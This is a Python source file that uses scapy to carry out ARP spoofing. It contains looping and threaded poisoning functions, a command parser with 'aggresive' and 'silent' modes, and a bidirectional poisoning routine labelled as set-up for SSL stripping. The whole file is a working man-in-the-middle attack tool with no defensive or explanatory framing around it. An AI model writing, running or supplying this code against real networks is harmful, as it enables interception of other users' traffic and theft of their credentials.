import scapy.all as sc
import shlex
import threading
import time

# ARP spoofing
def arp_spoof(target_ip, spoofed_ip):
    packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

# Continuously send ARP spoofing packets
def arp_spoof_loop(target_ip, spoofed_ip, interval):
    print("[*] Spoofing %s as %s ..." % (target_ip, spoofed_ip))
    while True:
        arp_spoof(target_ip, spoofed_ip)
        time.sleep(interval)
        print("Spoofing...")

# Performs ARP spoofing sending a limited number packets.
def arp_limited_spoof_loop(target_ip, spoofed_ip, count):
    print("[*] Spoofing %s as %s ..." % (target_ip, spoofed_ip))
    
    for i in range(count):
        arp_spoof(target_ip, spoofed_ip)
        time.sleep(1)
        
    print("ARP Poison to %s complete" % target_ip)

# Starts a thread that performs continuous ARP spoofing
def start_arp_thread(target_ip, spoofed_ip, interval):
    arp_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, spoofed_ip, interval))
    arp_thread.daemon = True
    arp_thread.start()

# Starts a thread that performs ARP spoofing sending a limited number of packets.
def start_limited_arp_thread(target_ip, spoofed_ip, count):
    arp_thread = threading.Thread(target=arp_limited_spoof_loop, args=(target_ip, spoofed_ip, count))
    arp_thread.daemon = True
    arp_thread.start()

# Basic ARP poisoning function
def start_arp_poison(cmd):
    args = shlex.split(cmd)
    target_ip = spoofed_ip =  None
    interval = 5 # default value
    for i, arg in enumerate(args):
        if arg == "-tgtip" and i + 1 < len(args):
            target_ip = args[i + 1]
        elif arg == "-spip" and i + 1 < len(args):
            spoofed_ip = args[i + 1]
        elif arg == "-mode" and i + 1 < len(args):
            mode = args[i + 1]
            if mode == "aggresive":
                interval = 1
            elif mode == "silent":
                interval = 10
    if not target_ip or not spoofed_ip:
        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
        return
    print("[*] Spoofing %s as %s..." % (target_ip, spoofed_ip))

    start_arp_thread(target_ip, spoofed_ip, interval)

# ARP poisoning for SSL stripping
def start_arp_poison_ssl(cmd):
    args = shlex.split(cmd)
    target_ip = spoofed_ip = None
    for i, arg in enumerate(args):
        if arg == "-tgtip" and i + 1 < len(args):
            target_ip = args[i + 1]
        elif arg == "-spip" and i + 1 < len(args):
            spoofed_ip = args[i + 1]
    if not target_ip or not spoofed_ip:
        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
        return
    print("[*] Spoofing %s as %s ..." % (target_ip, spoofed_ip))

    start_arp_thread(target_ip, spoofed_ip, 5)
    start_arp_thread(spoofed_ip, target_ip, 5)
    
    


